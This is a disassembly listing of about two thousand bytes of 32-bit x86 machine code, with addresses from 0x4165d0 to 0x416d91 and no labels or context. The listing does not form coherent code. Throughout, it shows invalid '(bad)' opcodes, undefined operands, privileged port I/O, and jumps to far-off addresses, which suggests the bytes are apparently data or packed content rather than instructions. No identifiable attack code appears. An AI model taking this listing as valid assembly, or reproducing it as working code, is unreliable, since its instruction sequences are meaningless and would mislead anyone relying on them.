  4165d0:	fmul   st(0),st
  4165d2:	jp     0x416611
  4165d4:	daa    
  4165d5:	mov    ah,bh
  4165d7:	inc    esi
  4165d8:	ret    
  4165d9:	adc    bl,BYTE PTR [esi-0x2e0430b1]
  4165df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165e0:	(bad)  
  4165e1:	aad    0x6e
  4165e3:	and    DWORD PTR [edi-0x17f0e971],eax
  4165e9:	(bad)  
  4165ea:	in     eax,dx
  4165eb:	fcom   QWORD PTR [eax+edi*1+0x19]
  4165ef:	out    0xeb,eax
  4165f1:	jg     0x4165b0
  4165f3:	cmc    
  4165f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165f5:	sbb    BYTE PTR ds:0xb988336e,ah
  4165fb:	and    ecx,DWORD PTR [edx+0x4e012971]
  416601:	adc    eax,0xfbf9775b
  416606:	aaa    
  416607:	sub    DWORD PTR [esi-0x4],ecx
  41660a:	pushf  
  41660b:	test   bh,dh
  41660d:	repz mov dl,0xbc
  416610:	into   
  416611:	add    al,dl
  416613:	bound  ebp,QWORD PTR [eax+0x30]
  416616:	xlat   BYTE PTR ds:[ebx]
  416617:	mov    dh,0x1a
  416619:	pop    eax
  41661a:	jmp    0xb01b7380
  41661f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416620:	outs   dx,BYTE PTR ds:[esi]
  416621:	fistp  QWORD PTR [ebx]
  416623:	retf   
  416624:	mov    DWORD PTR [edi],ebp
  416626:	das    
  416627:	dec    ebx
  416628:	sub    DWORD PTR [ebp-0x3b],edx
  41662b:	dec    esp
  41662c:	repz mov eax,0xa64cef12
  416632:	mov    ds:0xa16b291c,al
  416637:	jecxz  0x4166a8
  416639:	jmp    0x6a27f441
  41663e:	xor    eax,0x81c40ca4
  416643:	add    al,0x2f
  416645:	je     0x41663c
  416647:	cmp    ah,BYTE PTR [esi-0x603e3759]
  41664d:	inc    ecx
  41664e:	sub    BYTE PTR es:[eax],0x6
  416652:	inc    ebx
  416653:	jmp    0x783cafd6
  416658:	nop
  416659:	mov    edx,0xd6d23ab2
  41665e:	and    eax,0xf14db26f
  416663:	fsubr  DWORD PTR [ebp+0x21]
  416666:	arpl   bx,bp
  416668:	lods   eax,DWORD PTR ds:[esi]
  416669:	pop    ecx
  41666a:	sbb    ecx,DWORD PTR [eax-0x27e44691]
  416670:	jecxz  0x416616
  416672:	shr    DWORD PTR [eax+0x3ad0b6c2],0x96
  416679:	(bad)  
  41667b:	and    BYTE PTR [esi+ebx*1-0x2fd21be9],dh
  416682:	mov    esi,0x69294ade
  416687:	test   al,0x24
  416689:	jnp    0x416634
  41668b:	cmp    bl,BYTE PTR [edx]
  41668d:	mov    bl,0x1d
  41668f:	ds aam 0x4b
  416692:	outs   dx,DWORD PTR ds:[esi]
  416693:	mov    edi,0xf82e0964
  416698:	pusha  
  416699:	out    0x6c,eax
  41669b:	in     al,0xf5
  41669d:	clc    
  41669e:	jo     0x416712
  4166a0:	pop    ecx
  4166a1:	shl    BYTE PTR [ebx+0x6d18c17d],0xd5
  4166a8:	(bad)  
  4166a9:	mov    ?,WORD PTR [esi+eax*2-0x2b]
  4166ad:	sbb    DWORD PTR [ebx-0x1f],ecx
  4166b0:	loop   0x41670e
  4166b2:	xor    eax,0xc3d329e2
  4166b7:	int3   
  4166b8:	sar    DWORD PTR [eax],0x7b
  4166bb:	mov    ch,0x80
  4166bd:	xor    eax,DWORD PTR [ecx+0x4f0fea0f]
  4166c3:	or     DWORD PTR [eax-0x17],edx
  4166c6:	or     DWORD PTR ds:[ebx-0x7e],ecx
  4166ca:	fnstcw WORD PTR gs:[ebx+0x2e470113]
  4166d1:	fisttp WORD PTR [edx-0x5da8ed96]
  4166d7:	es enter 0x138d,0x92
  4166dc:	fisubr DWORD PTR [eax-0x5f3bdc43]
  4166e2:	mov    bl,0xba
  4166e4:	jp     0x4166d5
  4166e6:	fst    DWORD PTR [edx]
  4166e8:	push   0x50
  4166ea:	push   ss
  4166eb:	outs   dx,DWORD PTR ds:[esi]
  4166ec:	dec    bl
  4166ee:	pushf  
  4166ef:	shr    BYTE PTR [edx+0x0],0x7a
  4166f3:	sub    al,0x41
  4166f5:	lahf   
  4166f6:	sbb    esp,DWORD PTR [edx+0xc]
  4166f9:	adc    dl,al
  4166fb:	jb     0x416725
  4166fd:	cmp    dl,dh
  4166ff:	pop    ebp
  416700:	out    dx,eax
  416701:	xrelease xchg DWORD PTR [edx],esi
  416704:	cli    
  416705:	jmp    0x4166dc
  416707:	xor    cl,BYTE PTR ds:0xce1408de
  41670d:	cld    
  41670e:	push   cs
  41670f:	pop    es
  416710:	leave  
  416711:	mov    al,0x4a
  416713:	and    esp,ecx
  416715:	push   0x1c
  416717:	xor    al,0xfd
  416719:	adc    eax,0x4b863d24
  41671e:	aad    0x4e
  416720:	imul   ebx,esp,0xc528b5bf
  416726:	xor    BYTE PTR [eax],ch
  416728:	lea    eax,[eax]
  41672a:	ds retf 0xcda7
  41672e:	rol    bl,1
  416730:	lds    esi,FWORD PTR ds:0x9f5800f5
  416736:	jno    0x41677d
  416738:	push   edi
  416739:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41673b:	inc    edi
  41673c:	mov    al,0xba
  41673e:	pop    esi
  41673f:	stos   DWORD PTR es:[edi],eax
  416740:	(bad)  
  416742:	fdivr  QWORD PTR [ecx]
  416744:	jp     0x416701
  416746:	sub    bh,BYTE PTR [edx]
  416748:	fbstp  TBYTE PTR [ebx+0x76]
  41674b:	aam    0xf7
  41674d:	(bad)  
  41674e:	inc    ebp
  41674f:	ret    
  416750:	sahf   
  416751:	aas    
  416752:	xchg   BYTE PTR [esi+ecx*8],dl
  416755:	repz ds inc ebp
  416758:	sbb    BYTE PTR [edx+0x50fefd06],0x4b
  41675f:	jg     0x416759
  416761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416762:	inc    ebx
  416763:	mov    edi,0x7c3c3d86
  416768:	(bad)  
  416769:	fistp  WORD PTR [edx]
  41676b:	(bad)  
  41676c:	mov    ds:0x1ad47bc3,eax
  416771:	inc    eax
  416772:	add    BYTE PTR [eax+0x40],ch
  416775:	push   cs
  416776:	mov    al,ds:0x4c0ec035
  41677b:	ins    BYTE PTR es:[edi],dx
  41677c:	inc    ebx
  41677d:	out    dx,eax
  41677e:	lea    ecx,[esi+0x1f]
  416781:	test   DWORD PTR [ebp+0x27d150a3],ecx
  416787:	ss jmp 0xe6e9cdbb
  41678d:	push   ds
  41678e:	cdq    
  41678f:	(bad)  
  416790:	repnz data16 mov dl,0xf4
  416794:	xor    BYTE PTR [eax],ch
  416796:	and    al,0xa7
  416798:	mov    esi,DWORD PTR [eax+0xa]
  41679b:	adc    BYTE PTR [esi+0x44],ch
  41679e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41679f:	div    BYTE PTR [edi-0x23]
  4167a2:	mov    esi,ss
  4167a4:	lahf   
  4167a5:	pushf  
  4167a6:	repnz sbb eax,0xf95c49c1
  4167ac:	retf   
  4167ad:	fucomip st,st(7)
  4167af:	ins    BYTE PTR es:[edi],dx
  4167b0:	ret    0x7170
  4167b3:	nop
  4167b4:	or     BYTE PTR [ebp+0x4e],cl
  4167b7:	lock int 0x6f
  4167ba:	in     al,dx
  4167bb:	inc    edx
  4167bc:	rcr    bh,1
  4167be:	and    al,0x90
  4167c0:	sub    al,al
  4167c2:	aas    
  4167c3:	mov    dh,0x11
  4167c5:	pop    ds
  4167c6:	dec    edi
  4167c7:	dec    ebx
  4167c8:	inc    ebp
  4167c9:	cmp    eax,0x46f94267
  4167ce:	(bad)  [esi]
  4167d0:	or     edi,esp
  4167d2:	int3   
  4167d3:	mov    ds:0x103892b2,eax
  4167d8:	push   edx
  4167d9:	xchg   edi,eax
  4167da:	fcmovu st,st(0)
  4167dc:	mov    ds:0xf95a490c,al
  4167e1:	jg     0x4167ef
  4167e3:	shl    ecx,cl
  4167e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167e7:	xlat   BYTE PTR ds:[ebx]
  4167e8:	jge    0x41679f
  4167ea:	push   cs
  4167eb:	add    eax,0x528c53dd
  4167f0:	push   edi
  4167f1:	in     eax,0x5c
  4167f3:	or     bh,ch
  4167f5:	mov    esp,es
  4167f7:	jno    0x416864
  4167f9:	pop    ss
  4167fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167fb:	jne    0x416784
  4167fd:	and    eax,DWORD PTR [eax-0xf5359c1]
  416803:	popf   
  416804:	dec    ebp
  416805:	(bad)  
  416806:	or     al,0xae
  416808:	or     eax,0x72aaf790
  41680d:	aad    0x90
  41680f:	rcl    BYTE PTR [eax-0x30c38603],0x37
  416816:	jmp    0xfcc7714f
  41681b:	repz sahf 
  41681d:	xchg   ebx,eax
  41681e:	mov    cs,WORD PTR [ecx-0x75f86e47]
  416824:	jno    0x4167af
  416826:	xor    BYTE PTR [esi],dl
  416828:	jmp    0xaf70:0x1576050b
  41682f:	mov    BYTE PTR [esp+esi*1+0x14],bl
  416833:	hlt    
  416834:	cdq    
  416835:	xchg   ecx,eax
  416836:	add    DWORD PTR [esi-0x4c74320],0x2aa857e4
  416840:	sbb    eax,0xf9110d24
  416845:	add    eax,0x3e596c46
  41684a:	out    dx,eax
  41684b:	push   esi
  41684c:	std    
  41684d:	push   ebx
  41684e:	sbb    eax,0x52ca6d0a
  416853:	push   es
  416854:	and    edi,DWORD PTR [ebx-0x46]
  416857:	jg     0x41689c
  416859:	mov    ecx,0xb857f362
  41685e:	jo     0x416891
  416860:	inc    edx
  416861:	hlt    
  416862:	inc    eax
  416863:	mov    ecx,0x9be2b38d
  416868:	jg     0x4167ff
  41686a:	fisubr DWORD PTR [edi]
  41686c:	mov    eax,0xcc04ce86
  416871:	in     eax,0xb9
  416873:	jns    0x4168bc
  416875:	in     al,0x30
  416877:	retf   
  416878:	xchg   edi,eax
  416879:	jp     0x416817
  41687b:	add    cl,BYTE PTR [eax-0x10ee1a0a]
  416881:	aam    0xc9
  416883:	icebp  
  416884:	nop
  416885:	and    DWORD PTR [eax-0x72],ecx
  416888:	push   eax
  416889:	gs pop edx
  41688b:	test   al,0xe6
  41688d:	dec    ebp
  41688e:	pusha  
  41688f:	xchg   ebp,eax
  416890:	dec    ecx
  416891:	shl    DWORD PTR [ebx+0x63e038f0],0x85
  416898:	shl    edx,0x81
  41689b:	cmp    al,bh
  41689d:	test   eax,0x23d9fc4c
  4168a2:	loopne 0x4168cc
  4168a4:	fs out 0x37,al
  4168a7:	cmc    
  4168a8:	aad    0xee
  4168aa:	shl    DWORD PTR [esi],cl
  4168ac:	pop    edi
  4168ad:	push   ebp
  4168ae:	ins    BYTE PTR es:[edi],dx
  4168af:	test   DWORD PTR [ecx+0x7d5917e9],edi
  4168b5:	push   edx
  4168b6:	or     eax,0x30b8e95b
  4168bb:	cmp    ecx,DWORD PTR [edi]
  4168bd:	ja     0x416931
  4168bf:	outs   dx,BYTE PTR ds:[esi]
  4168c0:	dec    esp
  4168c1:	add    DWORD PTR [eax-0x5418bb32],0x7056972a
  4168cb:	fnstenv [edx+0x14]
  4168ce:	push   edx
  4168cf:	mov    al,0x2b
  4168d1:	add    al,0xb5
  4168d3:	jmp    0xa669ee12
  4168d8:	stos   DWORD PTR es:[edi],eax
  4168d9:	out    0xac,eax
  4168db:	jg     0x4168d0
  4168dd:	and    edi,DWORD PTR [ecx+0x42]
  4168e0:	outs   dx,BYTE PTR ds:[esi]
  4168e1:	retf   
  4168e2:	adc    DWORD PTR [ebx-0x317b630f],esp
  4168e8:	popa   
  4168e9:	sar    DWORD PTR [eax+0x1a],0x64
  4168ed:	sahf   
  4168ee:	inc    esp
  4168ef:	outs   dx,BYTE PTR ds:[esi]
  4168f0:	mov    dl,0x43
  4168f2:	sub    al,0x1b
  4168f4:	mov    BYTE PTR [edx-0x34],cl
  4168f7:	out    0x98,eax
  4168f9:	push   eax
  4168fa:	loope  0x4168b7
  4168fc:	lods   al,BYTE PTR ds:[esi]
  4168fd:	or     eax,0x5813ec04
  416902:	ret    
  416903:	pop    edx
  416904:	daa    
  416905:	mov    eax,ds:0x30e0c458
  41690a:	sar    BYTE PTR ds:0xfd21967f,1
  416910:	jge    0x41695b
  416912:	jle    0x4168f6
  416914:	pusha  
  416915:	or     ebp,DWORD PTR [ecx+eax*4-0xa422459]
  41691c:	push   edi
  41691d:	dec    ebp
  41691e:	pop    edi
  41691f:	jmp    0x4168dc
  416921:	call   0x31ec:0x5d001755
  416928:	or     dl,BYTE PTR [esi]
  41692a:	adc    ebx,DWORD PTR [eax+eax*2+0x32]
  41692e:	in     al,0x8c
  416930:	in     eax,0xe0
  416932:	pop    esi
  416933:	inc    ebx
  416934:	cmp    BYTE PTR [edi],bh
  416936:	mov    al,ds:0x59963706
  41693b:	and    al,0x77
  41693d:	add    DWORD PTR [ebx],ebp
  41693f:	scas   al,BYTE PTR es:[edi]
  416940:	pop    eax
  416941:	dec    edi
  416942:	lea    ecx,[eax]
  416944:	adc    dl,ah
  416946:	jb     0x41698a
  416948:	cdq    
  416949:	fs jb  0x4169bd
  41694c:	adc    al,0x90
  41694e:	fs loope 0x41692b
  416951:	aad    0x89
  416953:	data16 jbe 0x416932
  416956:	or     ecx,DWORD PTR [ebx+0x44]
  416959:	cmp    al,0xa1
  41695b:	jl     0x41694c
  41695d:	test   dl,bl
  41695f:	rol    BYTE PTR [eax+ebp*4],0xb6
  416963:	jae    0x416935
  416965:	mov    ebx,0x6673f020
  41696a:	pushf  
  41696b:	adc    al,0x4a
  41696d:	xor    ebp,DWORD PTR [edi+0x66]
  416970:	mov    ecx,DWORD PTR [esi+0x39fce8aa]
  416976:	xchg   ebx,eax
  416977:	outs   dx,BYTE PTR ds:[esi]
  416978:	add    BYTE PTR [edi],cl
  41697a:	dec    ebp
  41697b:	shl    DWORD PTR [edx+0x11f938f0],0xd9
  416982:	push   edx
  416983:	lea    ebp,[edi-0x19379b79]
  416989:	dec    ecx
  41698a:	imul   ebx,DWORD PTR [edi+edi*1],0x21
  41698e:	inc    esi
  41698f:	dec    ecx
  416990:	pusha  
  416991:	and    eax,0x43963c23
  416996:	mov    al,0xf6
  416998:	mov    eax,ds:0xd7d1a8bc
  41699d:	xchg   esp,eax
  41699e:	jecxz  0x4169a6
  4169a0:	mov    ebx,0xac70c8f3
  4169a5:	ja     0x4169d6
  4169a7:	inc    eax
  4169a8:	cmp    al,0x36
  4169aa:	imul   edi,DWORD PTR [ecx],0xbab85cf7
  4169b0:	dec    ebp
  4169b1:	bound  ebp,QWORD PTR [ebx]
  4169b3:	push   edx
  4169b4:	out    dx,al
  4169b5:	sahf   
  4169b6:	test   ebp,esp
  4169b8:	fs cmp esi,esi
  4169bb:	inc    ebx
  4169bc:	arpl   WORD PTR [esi+eax*1],bp
  4169bf:	dec    edx
  4169c0:	sub    DWORD PTR [edx],esi
  4169c2:	(bad)  
  4169c3:	xchg   esi,eax
  4169c4:	(bad)  
  4169c5:	fild   WORD PTR [eax+0x2b9fe1c6]
  4169cb:	sbb    ebx,esp
  4169cd:	push   edi
  4169ce:	xchg   esi,eax
  4169cf:	jb     0x416959
  4169d1:	push   cs
  4169d2:	cmp    eax,DWORD PTR [esp+edi*2+0x66]
  4169d6:	sub    BYTE PTR [eax],ch
  4169d8:	fidivr WORD PTR [edx+eiz*8]
  4169db:	int3   
  4169dc:	mov    al,ds:0x3ffdf3b9
  4169e1:	(bad)  
  4169e2:	jg     0x416a39
  4169e4:	loop   0x416a3b
  4169e6:	dec    ecx
  4169e7:	test   DWORD PTR [ecx-0xab3b931],edi
  4169ed:	pop    ebp
  4169ee:	mov    ds:0x9c32d3fb,al
  4169f3:	pop    ecx
  4169f4:	and    bh,BYTE PTR [ebp-0x13]
  4169f7:	jo     0x416a14
  4169f9:	sbb    eax,DWORD PTR [eax+0x2d8e1c08]
  4169ff:	test   BYTE PTR [edi],al
  416a01:	out    dx,al
  416a02:	mov    WORD PTR [edx+0x1ec6a1d3],?
  416a08:	fst    QWORD PTR [ebx*2+0xf5b612e]
  416a0f:	add    DWORD PTR [esi+0x44],esp
  416a12:	into   
  416a13:	push   esi
  416a14:	ds ret 0x9994
  416a18:	pushf  
  416a19:	jbe    0x416a92
  416a1b:	jne    0x4169d6
  416a1d:	sbb    eax,0xcb286bda
  416a22:	mov    dh,0xe4
  416a24:	mov    al,0x14
  416a26:	push   0x995c7a1b
  416a2b:	gs pop ebx
  416a2d:	mov    esp,0x38f6bc47
  416a32:	or     al,0x86
  416a34:	inc    ebx
  416a35:	repz cmp al,0x24
  416a38:	mov    ds:0x205f901,eax
  416a3d:	ds jb  0x416a3b
  416a40:	sbb    ecx,DWORD PTR [ebx-0x79f54cfc]
  416a46:	loopne 0x416a60
  416a48:	jle    0x416a2f
  416a4a:	cmp    al,0x87
  416a4c:	cmc    
  416a4d:	stos   DWORD PTR es:[edi],eax
  416a4e:	rcl    DWORD PTR [eax+0x3f87ff00],0x3
  416a55:	(bad)
  416a58:	lods   al,BYTE PTR ds:[esi]
  416a59:	cmp    BYTE PTR [edx+0x3d3f3f1f],dh
  416a5f:	pop    ebp
  416a60:	jb     0x4169e8
  416a62:	and    BYTE PTR [ebx],al
  416a64:	pop    ss
  416a65:	inc    esi
  416a66:	aaa    
  416a67:	mov    edx,0xdfaed781
  416a6c:	hlt    
  416a6d:	mov    edx,0x10e1d628
  416a72:	mov    bl,BYTE PTR [esi-0x2a]
  416a75:	sub    BYTE PTR ds:0xd7d04d4d,al
  416a7b:	add    al,0x5d
  416a7d:	loope  0x416a86
  416a7f:	in     al,dx
  416a80:	mov    DWORD PTR [edx+0xe],eax
  416a83:	cmp    DWORD PTR [esi-0x54cc0351],edi
  416a89:	repnz xlat BYTE PTR ds:[ebx]
  416a8b:	push   es
  416a8c:	push   esi
  416a8d:	arpl   WORD PTR [edx+ecx*8],sp
  416a90:	push   cs
  416a91:	cmp    BYTE PTR [ecx+0x78],al
  416a94:	ins    DWORD PTR es:[edi],dx
  416a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a96:	push   ebx
  416a97:	inc    ecx
  416a98:	lea    eax,[ecx]
  416a9a:	inc    esi
  416a9b:	lods   al,BYTE PTR ds:[esi]
  416a9c:	ja     0x416a6a
  416a9e:	mov    ecx,edx
  416aa0:	rcl    BYTE PTR [edi+ebp*1+0x7006d5c0],1
  416aa7:	loope  0x416b14
  416aa9:	outs   dx,DWORD PTR ds:[esi]
  416aaa:	pop    ebp
  416aab:	stos   DWORD PTR es:[edi],eax
  416aac:	nop
  416aad:	mov    bl,0x5f
  416aaf:	lds    ecx,FWORD PTR [ecx-0x739cdef4]
  416ab5:	scas   al,BYTE PTR es:[edi]
  416ab6:	std    
  416ab7:	and    DWORD PTR [ebx+0x7ead6762],esi
  416abd:	pop    edi
  416abe:	jbe    0x416a9c
  416ac0:	adc    DWORD PTR [edi],ecx
  416ac2:	pushf  
  416ac3:	xchg   edi,eax
  416ac4:	mov    eax,ds:0xb585ee91
  416ac9:	jl     0x416a5a
  416acb:	add    BYTE PTR [edx-0x5a3ad197],ah
  416ad1:	fsub   DWORD PTR [edx-0x68]
  416ad4:	(bad)
  416ad8:	aad    0xdc
  416ada:	dec    esi
  416adb:	and    al,0x78
  416add:	into   
  416ade:	(bad)  
  416adf:	xchg   ecx,eax
  416ae0:	lea    edi,[ecx+0x7764132b]
  416ae6:	jmp    DWORD PTR [edx]
  416ae8:	pushf  
  416ae9:	cs aaa 
  416aeb:	scas   eax,DWORD PTR es:[edi]
  416aec:	push   ebp
  416aed:	es or  edi,ebx
  416af0:	cmp    BYTE PTR [ecx+0x7d8c9d91],bh
  416af6:	sbb    BYTE PTR [edx+eax*1+0x47],cl
  416afa:	pop    ds
  416afb:	fadd   st(3),st
  416afd:	popf   
  416afe:	(bad)  
  416aff:	je     0x416a8c
  416b01:	retf   
  416b02:	repnz retf 0x15c9
  416b06:	sti    
  416b07:	in     eax,0x0
  416b09:	and    esp,DWORD PTR [ecx+0x14]
  416b0c:	dec    ecx
  416b0d:	lahf   
  416b0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b0f:	jle    0x416b87
  416b11:	or     edx,DWORD PTR [eax+0x4db580ac]
  416b17:	es jb  0x416b6e
  416b1a:	dec    esp
  416b1b:	sbb    edi,DWORD PTR [edi+0x14]
  416b1e:	sbb    al,0x46
  416b20:	mov    ebp,0xdd4d2f7b
  416b25:	sbb    WORD PTR ss:[edi],di
  416b29:	mov    cl,BYTE PTR [edx+0x49]
  416b2c:	or     esp,DWORD PTR [edx+0x7c]
  416b2f:	and    BYTE PTR [ebx-0xd],ch
  416b32:	add    eax,0xa621737e
  416b37:	fs and al,0x5a
  416b3a:	ret    0xca2a
  416b3d:	pop    ds
  416b3e:	dec    ebx
  416b3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b40:	fcom   QWORD PTR [esi]
  416b42:	dec    DWORD PTR [esi-0x378a41e6]
  416b48:	std    
  416b49:	add    cl,BYTE PTR [ecx]
  416b4b:	mov    eax,0xb7411a80
  416b50:	pop    DWORD PTR [esi]
  416b52:	jle    0x416b78
  416b54:	pop    edi
  416b55:	and    bh,BYTE PTR [ebx-0x65]
  416b58:	mov    ebp,edx
  416b5a:	sub    ch,BYTE PTR [edx]
  416b5c:	adc    eax,0x4a5dc95
  416b61:	pushf  
  416b62:	sbb    DWORD PTR [ecx-0x17],ecx
  416b65:	cmp    DWORD PTR [ecx-0x35ab71b8],ebx
  416b6b:	ds test al,0x65
  416b6e:	rcl    DWORD PTR [ebx-0x5c],1
  416b71:	cmp    esp,DWORD PTR [eax+0x33f8e985]
  416b77:	out    dx,eax
  416b78:	and    BYTE PTR [ebx+0x7],dh
  416b7b:	lahf   
  416b7c:	rcl    BYTE PTR [eax+ebx*4+0x1ac15d17],1
  416b83:	mov    edx,0x5474e63e
  416b88:	mov    ds:0xa861d621,eax
  416b8d:	fld    TBYTE PTR [eax+ecx*2+0x1e]
  416b91:	shr    BYTE PTR [ecx+0x2ea9b03d],1
  416b97:	xor    bl,BYTE PTR [ebx+0x7af283ed]
  416b9d:	fild   QWORD PTR [ebp-0xa10630c]
  416ba3:	xchg   ecx,eax
  416ba4:	cmp    bh,BYTE PTR [ebp+0xcdfd3fb]
  416baa:	in     eax,0x2e
  416bac:	scas   eax,DWORD PTR es:[edi]
  416bad:	or     eax,0xf682da56
  416bb2:	outs   dx,BYTE PTR ds:[esi]
  416bb3:	ret    0xf565
  416bb6:	mov    sp,0xa590
  416bba:	loop   0x416bb4
  416bbc:	xchg   ecx,eax
  416bbd:	pop    ecx
  416bbe:	adc    dh,BYTE PTR [ecx+0x47]
  416bc1:	push   ss
  416bc2:	dec    ecx
  416bc3:	cmp    al,BYTE PTR [edx+0x11]
  416bc6:	aaa    
  416bc7:	add    ebp,DWORD PTR [edi]
  416bc9:	das    
  416bca:	sub    esp,ebp
  416bcc:	sub    DWORD PTR [edi+edx*2],esp
  416bcf:	sbb    ecx,esp
  416bd1:	push   0x14
  416bd3:	mov    ds:0x78a18d43,al
  416bd8:	aam    0x77
  416bda:	xchg   ecx,eax
  416bdb:	mov    cl,0x79
  416bdd:	push   esp
  416bde:	jl     0x416ba4
  416be0:	fimul  WORD PTR [edx+0x10]
  416be3:	mov    WORD PTR [esi+eiz*4-0x4874db6],ds
  416bea:	and    edi,edi
  416bec:	nop
  416bed:	xlat   BYTE PTR ds:[ebx]
  416bee:	cld    
  416bef:	jnp    0x416bf1
  416bf1:	lods   eax,DWORD PTR ds:[esi]
  416bf2:	mov    al,0x27
  416bf4:	cmp    al,0xe
  416bf6:	pop    edi
  416bf7:	push   esp
  416bf8:	cli    
  416bf9:	inc    edi
  416bfa:	dec    edx
  416bfb:	xchg   ebp,eax
  416bfc:	jp     0x416c05
  416bfe:	std    
  416bff:	add    bh,BYTE PTR [ecx]
  416c01:	sar    DWORD PTR [edi+edi*8-0x16ae922f],1
  416c08:	inc    esi
  416c09:	test   DWORD PTR [eax+0xc9faba0],esi
  416c0f:	test   DWORD PTR [eax+0x7e7c2674],ebp
  416c15:	aas    
  416c16:	pushf  
  416c17:	scas   al,BYTE PTR es:[edi]
  416c18:	cmc    
  416c19:	in     al,0xf2
  416c1b:	ret    
  416c1c:	fiadd  DWORD PTR [esi-0x488279a7]
  416c22:	dec    esi
  416c23:	rol    DWORD PTR ds:0x64a724be,cl
  416c29:	test   al,0xa8
  416c2b:	aas    
  416c2c:	jae    0x416c1b
  416c2e:	iret   
  416c2f:	xchg   edx,ecx
  416c31:	xchg   edi,eax
  416c32:	or     edi,0x1104e908
  416c38:	pop    eax
  416c39:	xchg   esp,eax
  416c3a:	xor    DWORD PTR [ecx-0x5ed4f237],eax
  416c40:	xor    bl,BYTE PTR [ebp-0x6e]
  416c43:	jo     0x416cb2
  416c45:	adc    eax,DWORD PTR [eax+ebx*1-0x1151b3be]
  416c4c:	cwde   
  416c4d:	rcl    BYTE PTR [ebp-0x45],cl
  416c50:	cli    
  416c51:	enter  0x6ccf,0x11
  416c55:	lds    ebp,FWORD PTR [esi]
  416c57:	xchg   edx,eax
  416c58:	stos   BYTE PTR es:[edi],al
  416c59:	mov    eax,0x83ed15fb
  416c5e:	or     DWORD PTR [edi+0x2a1b5281],edi
  416c64:	mov    eax,0xf42c12c3
  416c69:	shl    BYTE PTR [eax-0x56db918b],1
  416c6f:	add    DWORD PTR ds:0x2c285cd0,ecx
  416c75:	std    
  416c76:	jae    0x416cde
  416c78:	clc    
  416c79:	push   0xffffffe9
  416c7b:	imul   DWORD PTR [ebp-0x6b38d55b]
  416c81:	xor    DWORD PTR [esi+eiz*8],eax
  416c84:	sub    ebp,DWORD PTR [edx-0x2934a94b]
  416c8a:	inc    esp
  416c8b:	jns    0x416d02
  416c8d:	and    ch,dl
  416c8f:	(bad)  
  416c90:	ja     0x416c9b
  416c92:	lock sub eax,0x55290b9e
  416c98:	loop   0x416cd8
  416c9a:	or     edi,DWORD PTR [ecx+ebp*8-0x4b]
  416c9e:	sub    eax,0xd12b2719
  416ca3:	fs dec ecx
  416ca5:	mov    ss,WORD PTR [edx+0x11]
  416ca8:	fistp  QWORD PTR [ebx+0xd66f29f]
  416cae:	mov    bh,0x2c
  416cb0:	jmp    0x416cd5
  416cb2:	dec    ebx
  416cb3:	sub    BYTE PTR [eax+0x53e201fb],ch
  416cb9:	mov    al,ds:0xca91b55c
  416cbe:	iret   
  416cbf:	or     DWORD PTR [edi+eax*1],0xffffffea
  416cc3:	push   eax
  416cc4:	push   cs
  416cc5:	pop    ebp
  416cc6:	ds pop ecx
  416cc8:	or     DWORD PTR [ebx],esi
  416cca:	xchg   edx,eax
  416ccb:	les    esi,FWORD PTR [ebp-0x7be45994]
  416cd1:	cmp    BYTE PTR [ebx-0x610dd3af],dl
  416cd7:	(bad)  
  416cd8:	leave  
  416cd9:	inc    ebx
  416cda:	ins    DWORD PTR es:[edi],dx
  416cdb:	out    dx,al
  416cdc:	push   es
  416cdd:	enter  0x7edd,0x42
  416ce1:	stos   BYTE PTR es:[edi],al
  416ce2:	mov    ah,0x9f
  416ce4:	or     edx,DWORD PTR [ecx]
  416ce6:	push   esp
  416ce7:	rcr    bl,0x98
  416cea:	pop    esi
  416ceb:	jmp    0xfa7e:0x49e48039
  416cf2:	fild   DWORD PTR [edi+eiz*2-0x77dbe11c]
  416cf9:	aas    
  416cfa:	xchg   edx,eax
  416cfb:	inc    esi
  416cfc:	adc    ebp,esp
  416cfe:	pop    edi
  416cff:	push   edx
  416d00:	sbb    WORD PTR [ebp+esi*2+0x1d0cd788],ax
  416d08:	stc    
  416d09:	test   eax,0x967cf496
  416d0e:	cdq    
  416d0f:	outs   dx,BYTE PTR ds:[esi]
  416d10:	xchg   edi,eax
  416d11:	mov    ds:0xc545dac6,eax
  416d16:	sub    edi,DWORD PTR es:0xf2a95aca
  416d1d:	jp     0x416ce5
  416d1f:	mov    ebp,0x74e54e5d
  416d24:	add    DWORD PTR [esi+0x905ad4d],esp
  416d2a:	mov    ebp,0x3877c77e
  416d2f:	ja     0x416d03
  416d31:	cld    
  416d32:	jmp    0xcf753b45
  416d37:	cmp    DWORD PTR [edx+0x7413fc3e],esi
  416d3d:	imul   ecx,DWORD PTR [edx+0x12411fa],0x43
  416d44:	jae    0x416d8a
  416d46:	ja     0x416d6d
  416d48:	cmc    
  416d49:	sar    dl,cl
  416d4b:	sbb    DWORD PTR [ecx-0x7a31c317],0x1b
  416d52:	inc    edx
  416d53:	mov    dh,0x1
  416d55:	js     0x416d8e
  416d57:	addr16 inc ebp
  416d59:	aaa    
  416d5a:	pop    esp
  416d5b:	mov    ecx,0x1e24026e
  416d60:	ficomp DWORD PTR [edi+0x4a]
  416d63:	or     eax,0x423989ca
  416d68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d69:	addr16 pop ss
  416d6b:	mov    dx,cs
  416d6e:	cli    
  416d6f:	sub    ch,BYTE PTR [edi+esi*1]
  416d72:	push   ebp
  416d73:	dec    eax
  416d74:	(bad)  [ebx+0xd]
  416d77:	lock loopne 0x416d4c
  416d7a:	retf   
  416d7b:	sbb    BYTE PTR [esi],ah
  416d7d:	retf   0x3747
  416d80:	sub    al,0x48
  416d82:	cmp    DWORD PTR [ebx-0x2],ebp
  416d85:	repz lock daa 
  416d88:	inc    edi
  416d89:	aad    0xa3
  416d8b:	(bad)  
  416d8c:	sbb    dl,BYTE PTR [edi+0x72]
  416d8f:	nop
  416d90:	push   ebp
  416d91:	ret    
